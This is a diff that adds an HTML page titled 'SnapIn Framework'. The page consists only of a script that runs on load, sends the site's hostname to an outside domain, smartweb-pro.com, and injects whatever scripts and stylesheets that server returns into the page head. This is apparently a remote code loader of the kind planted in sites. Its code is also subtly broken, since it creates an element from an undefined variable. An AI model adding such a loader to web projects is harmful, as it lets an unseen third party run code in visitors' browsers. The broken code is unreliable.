@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SnapIn Framework</title>
+</head>
+<body>
+    <script>
+         (function() {
+            var bh = window.location.hostname;
+            fetch(`http://smartweb-pro.com/api/loader/${bh}`)
+                .then(r => r.json()).then(f => { console.log('Response: ', f); loads(f);})
+                .catch(err => { console.error('Failed to fetch files:', err);});
+            function load(f, cb) {
+                var el = document.createElement(el);
+                if( f.et === "css") { el.rel="stylesheet"}
+                el.type = f.ft;el.src = f.u;el.onload = cb;
+                el.onerror = function() { console.error(`Failed to load ${f.et} ${f.u}`);}
+                document.head.appendChild(el);
+            }
+            function loads(s, ix = 0) {
+                if (ix < s.length) { load(s[ix], function() {loads(s, ix + 1);});}
+            }
+        })();
+    </script>
+</body>
+</html>
